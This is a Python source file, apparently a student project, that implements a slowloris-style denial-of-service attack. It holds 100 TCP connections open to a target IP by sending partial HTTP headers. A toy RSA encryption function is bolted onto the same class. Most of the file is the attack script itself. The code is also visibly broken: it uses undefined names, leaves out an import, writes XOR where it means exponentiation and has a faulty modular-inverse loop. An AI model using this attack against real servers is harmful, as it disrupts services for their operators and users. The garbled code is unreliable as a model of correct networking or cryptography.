#This code uses/builds off code found in https://medium.com/@joel.barmettler/denial-of-service-attacks-do-not-always-have-to-flood-the-server-with-requests-to-make-him-shut-c630e59b731e
import random
import math
import sympy
import socket
import time
#this is the server that we will attack
class DOSServer():
    #port 80 is standard for connections 
    def __init__(self, ip, port=80):
        #IP address to be attacked
        self.ip = ip
        #port of connection
        self.port = port
        #dummy header information for our get requests
        self.headers = [
            "User-Agent: Mozilla/5.0 Gecko/20091102 Chrome/3.5.5",
            "Accept-Language: en-us,en;q=0.5"
        ]

    def createSocket(self):
        try:
            #AF_INET sets the socket to communicate with IPv4 addresses
            #SOCK_STREAM creates a TCP socket
            #Need TCP connection because TCP creates a connection, vs. UCP which is connectionless
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #set socket timeout
            s.settimeout(10)
            #connect socket to the server 
            s.connect((self._ip, self._port))
            #send the data to the server
            s.send(self.getMessage("Get /?"))

            for header in self.headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        #create a new socket if there's an error with this one 
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.createSocket()

    def attack(self):
        #how long we will sleep before sending new data
        dataSleep = 3
        #how long we will run our attack
        timeout=sys.maxsize
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self.sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))
    #add functions for encryption 
    def rsaEncryption(self,message):
        #generate two prime numbers 
        p = -1
        q = -1
        while (p ==-1):
            r1 = random.randint(2,100)
            if (sympy.isprime(r1)):
                p = r1
        while (q==-1):
            r2 = random.randint(2,100)
            if (sympy.isprime(r2)):
                if r2 != p:
                    q = r2
        n = p*q
        n2 = (p-1)*(q-1)
        #calculate e (less than n2 and coprime w/ n2)
        e = -1
        while (e==-1):
            r3 = random.randint(2,n2)
            #coprime check
            if (math.gcd(r3, n2) == 1):
                e = r3
        d = -1
        count = 2
        # (e*d) -1 mod n2 = 0
        while (d==-1):
            count += 1
            if ((count*e) -1 % n2) == 0:
                d = count

        #e*x+n2*y = 1
        #d = e^-1 mod n2
        d = pow(e,-1,n2)   
        inputValue = 0
        for i in range(len(message)):
            char = message[i]
            value = ord(char) - 96 # from https://www.kite.com/python/answers/how-to-convert-letters-to-numbers-in-python
            inputValue += value * 10^i
        encryptedMessage = inputValue^e % n

        #too slow
        # while (p == -1):
        #     r1 = random.randint(2,100)
        #     for i in range(2,int(math.sqrt(r1) + 1)):
        #         if (r1 % i == 0):
        #             prime = False
        #             break
        #     if (prime == True):
        #         p = r1
        #         print(p)
        # prime = True
        # while (q == -1):
        #     r2 = random.randint(2,100)
        #     for i in range(2,int(math.sqrt(r2) + 1)):
        #         if (r2 % i == 0):
        #             prime = False
        #             break
        #     if (prime == True):
        #         q = r2
        #         print(q)
        
            




numberOfSockets = 100
#change this to the IP of the server to be attacked
DOSServer= DOSServer(ip)
#create sockets based on number of sockets
DOSServer.sockets = [DOSServer.createSocket() for socket in range(numberOfSockets)]


